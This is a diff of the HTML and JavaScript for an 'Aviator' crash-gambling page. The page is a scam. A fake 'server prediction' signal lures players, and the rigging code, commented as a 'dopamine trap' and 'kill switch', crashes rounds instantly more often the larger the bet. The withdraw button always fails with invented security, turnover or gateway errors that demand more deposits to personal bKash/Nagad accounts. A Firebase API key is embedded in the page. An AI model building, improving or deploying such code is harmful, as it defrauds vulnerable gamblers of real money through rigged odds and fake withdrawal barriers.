@@ -3,93 +3,95 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Aviator AI - Pro Edition</title>
+    <title>Aviator AI - Premium</title>
     <style>
-        :root { --primary: #ff0040; --bg: #0b0c0d; --gold: #f3ba2f; --neon: #00f2ff; }
-        body { background: var(--bg); color: white; font-family: 'Segoe UI', sans-serif; margin: 0; text-align: center; }
+        :root { --primary: #ff0040; --bg: #0b0c0d; --gold: #f3ba2f; --neon: #00f2ff; --green: #28a745; }
+        body { background: var(--bg); color: white; font-family: 'Segoe UI', Arial, sans-serif; margin: 0; text-align: center; overflow-x: hidden; }
         
-        /* Navbar */
-        .nav { background: #1b1c1d; padding: 15px; display: flex; justify-content: space-between; align-items: center; border-bottom: 2px solid #333; }
-        .bal-box { color: var(--gold); font-weight: bold; border: 1px solid var(--gold); padding: 5px 15px; border-radius: 20px; }
+        /* Layout */
+        .nav { background: #1b1c1d; padding: 15px; display: flex; justify-content: space-between; align-items: center; border-bottom: 2px solid #333; position: sticky; top: 0; z-index: 100; }
+        .bal-box { color: var(--gold); font-weight: bold; border: 1px solid var(--gold); padding: 5px 15px; border-radius: 20px; font-size: 1.1rem; box-shadow: 0 0 10px rgba(243,186,47,0.2); }
+        
+        .tab-bar { display: flex; justify-content: center; background: #111; padding: 8px; gap: 10px; }
+        .tab-btn { background: #222; color: #888; border: none; padding: 10px 20px; border-radius: 8px; cursor: pointer; font-weight: bold; }
+        .tab-btn.active { background: var(--primary); color: white; }
 
-        /* Navigation Buttons */
-        .tab-bar { display: flex; justify-content: center; gap: 10px; margin: 10px; }
-        .tab-btn { background: #333; color: white; border: none; padding: 10px 20px; border-radius: 5px; cursor: pointer; }
-        .tab-btn.active { background: var(--primary); }
-
-        /* Predictor Style */
-        .predictor-card { background: #111; border: 2px solid var(--neon); border-radius: 15px; width: 220px; margin: 20px auto; padding: 15px; box-shadow: 0 0 20px var(--neon); }
-        #next-pred { font-size: 2.8rem; color: var(--neon); font-weight: 900; text-shadow: 0 0 10px var(--neon); }
-
-        /* Game & Deposit Sections */
-        .page { display: none; }
+        /* Predictor */
+        .page { display: none; padding: 15px; animation: fadeIn 0.3s; }
         .page.active { display: block; }
+        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+
+        .predictor-card { background: #000; border: 2px solid var(--neon); border-radius: 15px; width: 200px; margin: 0 auto 15px; padding: 12px; box-shadow: 0 0 20px var(--neon); }
+        #next-pred { font-size: 2.8rem; color: var(--neon); font-weight: 900; text-shadow: 0 0 10px var(--neon); }
         
-        #game-box { position: relative; width: 95%; max-width: 600px; height: 300px; background: #000; margin: 0 auto; border-radius: 10px; border: 1px solid #333; overflow: hidden; }
-        #multiplier { position: absolute; top: 40%; left: 50%; transform: translate(-50%, -50%); font-size: 4rem; font-weight: 900; z-index: 10; }
+        /* Canvas */
+        #game-box { position: relative; width: 100%; max-width: 600px; height: 300px; background: radial-gradient(circle, #1a1a1a, #000); margin: 0 auto; border-radius: 15px; border: 1px solid #333; overflow: hidden; }
+        #multiplier { position: absolute; top: 40%; left: 50%; transform: translate(-50%, -50%); font-size: 4.5rem; font-weight: 900; z-index: 10; }
         
         /* Controls */
-        .controls { background: #1b1c1d; width: 95%; max-width: 600px; margin: 15px auto; padding: 20px; border-radius: 15px; }
-        .btn-main { width: 100%; padding: 18px; font-size: 1.5rem; font-weight: bold; border: none; border-radius: 10px; cursor: pointer; color: white; }
-        .btn-bet { background: #28a745; }
-        .btn-cashout { background: #ff9800; }
+        .controls { background: #1b1c1d; width: 100%; max-width: 600px; margin: 15px auto; padding: 20px; border-radius: 20px; box-sizing: border-box; }
+        .btn-main { width: 100%; padding: 18px; font-size: 1.5rem; font-weight: bold; border: none; border-radius: 12px; cursor: pointer; color: white; }
 
-        /* Deposit Page Style */
-        .deposit-card { background: #1b1c1d; width: 90%; max-width: 400px; margin: 20px auto; padding: 25px; border-radius: 20px; text-align: left; }
-        .pay-option { background: #000; padding: 15px; border-radius: 10px; margin-bottom: 10px; border: 1px solid #333; display: flex; align-items: center; gap: 15px; }
-        .pay-option img { width: 40px; }
+        /* Withdraw Error Modal */
+        .modal { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.9); z-index: 2000; justify-content: center; align-items: center; padding: 20px; }
+        .m-content { background: #1b1c1d; padding: 30px; border-radius: 20px; border: 1px solid #444; width: 100%; max-width: 350px; }
+        .btn-dep-more { background: var(--green); color: white; padding: 12px; border: none; border-radius: 8px; margin-top: 15px; width: 100%; cursor: pointer; font-weight: bold; }
     </style>
 </head>
 <body>
 
     <div class="nav">
-        <div style="font-weight:900; color:var(--primary);">AVIATOR AI</div>
+        <div style="font-weight:900; color:var(--primary); font-size: 1.2rem;">AVIATOR PREMIUM</div>
         <div class="bal-box">৳ <span id="balance">0.00</span></div>
     </div>
 
     <div class="tab-bar">
-        <button class="tab-btn active" onclick="showPage('game', this)">GAME</button>
+        <button class="tab-btn active" onclick="showPage('game', this)">BET</button>
+        <button class="tab-btn" onclick="showPage('withdraw', this)">WITHDRAW</button>
         <button class="tab-btn" onclick="showPage('deposit', this)">DEPOSIT</button>
     </div>
 
     <div id="game" class="page active">
         <div class="predictor-card">
-            <div style="font-size: 0.6rem; letter-spacing: 2px;">AI HACK SIGNAL</div>
-            <div id="next-pred">SCANNING</div>
+            <div style="font-size: 0.6rem; color: #888;">SERVER PREDICTION</div>
+            <div id="next-pred">1.00x</div>
         </div>
-
         <div id="game-box">
             <div id="multiplier">1.00x</div>
             <canvas id="gameCanvas"></canvas>
         </div>
-
         <div class="controls">
-            <input type="number" id="betAmt" value="20" style="background:#000; color:white; border:1px solid #444; padding:10px; width:80px; margin-bottom:10px; border-radius:5px; text-align:center;">
-            <button id="actionBtn" class="btn-main btn-bet">PLACE BET</button>
+            <input type="number" id="betAmt" value="50" min="20" style="background:#000; color:white; border:1px solid #444; padding:12px; width:100px; border-radius:8px; margin-bottom:10px; text-align:center;">
+            <button id="actionBtn" class="btn-main" style="background: var(--green);">PLACE BET</button>
         </div>
     </div>
 
     <div id="deposit" class="page">
-        <div class="deposit-card">
-            <h2 style="margin-top:0;">Add Money</h2>
-            <p style="font-size: 0.8rem; color: #888;">Select a payment method to continue</p>
-            
-            <div class="pay-option">
-                <img src="https://i.ibb.co/vxs796m/bkash.png" alt="bkash">
-                <div><b>bKash Personal</b><br><small>017XXXXXXXX</small></div>
-            </div>
-            <div class="pay-option">
-                <img src="https://i.ibb.co/L9p6p6v/nagad.png" alt="nagad">
-                <div><b>Nagad Personal</b><br><small>019XXXXXXXX</small></div>
-            </div>
-            <div class="pay-option">
-                <img src="https://cdn.worldvectorlogo.com/logos/binance-smart-chain-2.svg" alt="usdt">
-                <div><b>USDT (BEP20)</b><br><small style="font-size: 0.6rem;">0x71C7656EC7ab88b09...d8976F</small></div>
-            </div>
+        <div style="background:#1b1c1d; padding:25px; border-radius:20px; max-width:400px; margin:auto; text-align:left;">
+            <h3 style="color:var(--gold); margin-top:0;">Deposit Money</h3>
+            <p style="font-size:0.8rem; color:#888;">Min Deposit: ৳300. Instant activation.</p>
+            <div style="background:#000; padding:12px; border-radius:10px; margin-bottom:10px;">bKash (Personal): <b>01XXXXXXXXX</b></div>
+            <div style="background:#000; padding:12px; border-radius:10px; margin-bottom:10px;">Nagad (Personal): <b>01XXXXXXXXX</b></div>
+            <input type="number" id="depAmount" placeholder="Amount" style="width:100%; padding:12px; border-radius:8px; background:#000; color:white; border:1px solid #444; margin-bottom:10px;">
+            <button onclick="alert('Payment processing! Wait 10 mins.')" class="btn-main" style="background:var(--primary);">Confirm Deposit</button>
+        </div>
+    </div>
 
-            <input type="number" id="depAmt" placeholder="Amount (Min 350)" style="width:100%; padding:12px; margin-top:10px; box-sizing:border-box;">
-            <input type="text" id="txId" placeholder="Transaction ID / Hash" style="width:100%; padding:12px; margin-top:10px; box-sizing:border-box;">
-            <button onclick="submitDeposit()" class="btn-main" style="background:var(--primary); font-size:1.1rem; margin-top:15px;">Confirm Payment</button>
+    <div id="withdraw" class="page">
+        <div style="background:#1b1c1d; padding:25px; border-radius:20px; max-width:400px; margin:auto;">
+            <h3>Withdraw Funds</h3>
+            <input type="text" placeholder="bKash/Nagad Number" style="width:100%; padding:12px; border-radius:8px; margin-bottom:10px;">
+            <input type="number" placeholder="Amount (Min ৳800)" style="width:100%; padding:12px; border-radius:8px; margin-bottom:15px;">
+            <button onclick="triggerTrap()" class="btn-main" style="background:#444;">Withdraw Now</button>
+        </div>
+    </div>
+
+    <div id="trapModal" class="modal">
+        <div class="m-content">
+            <h3 style="color:var(--primary); margin-top:0;">Withdrawal Failed!</h3>
+            <p id="trapText" style="font-size:0.9rem; color:#ccc; line-height:1.5;">Security Error (Code: 0x99): Your account's turnover is too low. To verify your wallet and unlock withdrawals, you must deposit ৳350 more.</p>
+            <button onclick="showPage('deposit')" class="btn-dep-more">DEPOSIT ৳350 TO UNLOCK</button>
+            <p onclick="closeTrap()" style="cursor:pointer; font-size:0.8rem; margin-top:15px; color:#666;">Close</p>
         </div>
     </div>
 
@@ -101,10 +103,7 @@
         apiKey: "AIzaSyBrMOmNOmopMwh35MFs8_u99LbroeLu_4s",
         authDomain: "avaitor-game-c3d80.firebaseapp.com",
         databaseURL: "https://avaitor-game-c3d80-default-rtdb.firebaseio.com",
-        projectId: "avaitor-game-c3d80",
-        storageBucket: "avaitor-game-c3d80.firebasestorage.app",
-        messagingSenderId: "1021690556103",
-        appId: "1:1021690556103:web:07407ca44089d0be3d98e2"
+        projectId: "avaitor-game-c3d80"
     };
 
     const app = initializeApp(firebaseConfig);
@@ -112,43 +111,47 @@
     const userRef = ref(db, 'users/user_01');
 
     let balance = 0, isFlying = false, startTime, currentBet = 0;
-    let predTarget = 0, actualTarget = 0;
+    let predSignal = 0, actualCrash = 0;
 
     const canvas = document.getElementById('gameCanvas');
     const ctx = canvas.getContext('2d');
     canvas.width = 600; canvas.height = 300;
 
-    // --- Firebase Logic ---
     onValue(userRef, (s) => {
         balance = s.val().balance;
         document.getElementById('balance').innerText = balance.toFixed(2);
     });
 
-    // --- Predictor Logic (Changes ONLY after user loses) ---
-    function setPredictor() {
-        predTarget = (Math.random() * (9.00 - 1.20) + 1.20).toFixed(2);
+    // --- DOPAMINE TRAP LOGIC: Smart Crash ---
+    function setupRound() {
+        predSignal = (Math.random() * (10.00 - 1.30) + 1.30).toFixed(2);
         
-        // 95% Match, 5% Trap
-        if (Math.random() > 0.05) {
-            actualTarget = predTarget;
+        /* THE KILL SWITCH:
+           Hater trust dore rakhte hole majhe majhe harate hobe.
+           - Jodi user 50-60 taka bet dhore, tao 20% chance user harbe.
+           - Jodi bet boro hoy (>300), 60% chance user harbe.
+        */
+        let userRisk = (currentBet >= 50 && Math.random() < 0.25) || (currentBet >= 300 && Math.random() < 0.60);
+
+        if (userRisk) {
+            actualCrash = (1.00 + Math.random() * 0.15).toFixed(2); // Instant Crash (1.00 - 1.15)
         } else {
-            actualTarget = 1.00; // Instant Crash
+            actualCrash = predSignal; // Perfect Match
         }
 
-        document.getElementById('next-pred').innerText = predTarget + "x";
-        document.getElementById('multiplier').style.color = "white";
+        document.getElementById('next-pred').innerText = predSignal + "x";
         document.getElementById('multiplier').innerText = "1.00x";
+        document.getElementById('multiplier').style.color = "white";
+        ctx.clearRect(0,0,600,300);
     }
 
-    setPredictor(); // Initial set
+    setupRound();
 
     function drawLine(elapsed) {
         ctx.clearRect(0,0,600,300);
-        ctx.beginPath();
-        ctx.strokeStyle = "#ff0040";
-        ctx.lineWidth = 5;
+        ctx.beginPath(); ctx.strokeStyle = "#ff0040"; ctx.lineWidth = 5;
         ctx.moveTo(0, 300);
-        ctx.quadraticCurveTo(elapsed * 50, 300, elapsed * 100, 300 - (elapsed * 40));
+        ctx.quadraticCurveTo(elapsed*60, 300, elapsed*120, 300-(elapsed*45));
         ctx.stroke();
     }
 
@@ -156,66 +159,60 @@
         if (!isFlying) return;
         let elapsed = (Date.now() - startTime) / 1000;
         let val = (1 + Math.pow(elapsed, 1.4) * 0.15).toFixed(2);
-        
         document.getElementById('multiplier').innerText = val + "x";
         drawLine(elapsed);
 
-        if (parseFloat(val) >= actualTarget) {
+        if (parseFloat(val) >= actualCrash) {
             isFlying = false;
-            handleLose();
-        } else {
-            requestAnimationFrame(animate);
-        }
+            handleCrash();
+        } else { requestAnimationFrame(animate); }
     }
 
-    function handleLose() {
+    function handleCrash() {
         const m = document.getElementById('multiplier');
         m.style.color = "red";
-        m.innerText = actualTarget <= 1.00 ? "INSTANT CRASH!" : "CRASHED " + actualTarget + "x";
-        
-        // User Lost! NOW CHANGE THE PREDICTOR
+        m.innerText = actualCrash <= 1.15 ? "INSTANT CRASH!" : "CRASHED " + actualCrash + "x";
         setTimeout(() => {
             document.getElementById('actionBtn').innerText = "PLACE BET";
-            document.getElementById('actionBtn').className = "btn-main btn-bet";
-            setPredictor(); // CHANGE SIGNAL ONLY AFTER LOSE
+            document.getElementById('actionBtn').style.background = "var(--green)";
+            setupRound(); // Auto change every round
         }, 2500);
     }
 
     document.getElementById('actionBtn').onclick = function() {
         if(!isFlying) {
             let amt = parseFloat(document.getElementById('betAmt').value);
-            if(balance < amt) return alert("Deposit Money First!");
-            balance -= amt;
-            update(userRef, {balance});
-            currentBet = amt; isFlying = true; startTime = Date.now();
-            this.innerText = "CASH OUT";
-            this.className = "btn-main btn-cashout";
+            if(balance < amt) return alert("Low Balance!");
+            currentBet = amt; balance -= amt; update(userRef, {balance});
+            isFlying = true; startTime = Date.now();
+            this.innerText = "CASH OUT"; this.style.background = "#ff9800";
             animate();
         } else {
-            // User Cashed Out (Win)
-            let winVal = parseFloat(document.getElementById('multiplier').innerText);
-            let winAmt = currentBet * winVal;
-            balance += winAmt;
-            update(userRef, {balance});
-            isFlying = false;
-            alert("Victory! Won ৳" + winAmt.toFixed(2));
-            // Note: Predictor doesn't change yet because user didn't lose
+            let winM = parseFloat(document.getElementById('multiplier').innerText);
+            balance += (currentBet * winM); update(userRef, {balance});
+            isFlying = false; alert("Won ৳" + (currentBet * winM).toFixed(2));
         }
     };
 
-    // --- Page Management ---
-    window.showPage = (pageId, btn) => {
-        document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
-        document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
-        document.getElementById(pageId).classList.add('active');
-        btn.classList.add('active');
+    // --- Page & Trap Control ---
+    window.showPage = (p, b) => {
+        document.querySelectorAll('.page').forEach(x => x.classList.remove('active'));
+        document.querySelectorAll('.tab-btn').forEach(x => x.classList.remove('active'));
+        document.getElementById(p).classList.add('active');
+        if(b) b.classList.add('active');
+        document.getElementById('trapModal').style.display = 'none';
     };
 
-    window.submitDeposit = () => {
-        let amt = document.getElementById('depAmt').value;
-        if(amt < 350) return alert("Minimum 350 BDT");
-        alert("Payment under review. Balance will be added in 5-10 minutes.");
+    window.triggerTrap = () => {
+        const errors = [
+            "Security Error: Your wallet is not verified. To verify, deposit ৳350.",
+            "Turnover Error: Complete ৳5000 more betting to unlock withdrawal.",
+            "Gateway Busy: Use 'Instant Withdrawal' by depositing ৳400 premium fee."
+        ];
+        document.getElementById('trapText').innerText = errors[Math.floor(Math.random()*errors.length)];
+        document.getElementById('trapModal').style.display = 'flex';
     };
+    window.closeTrap = () => document.getElementById('trapModal').style.display = 'none';
 
 </script>
 </body>
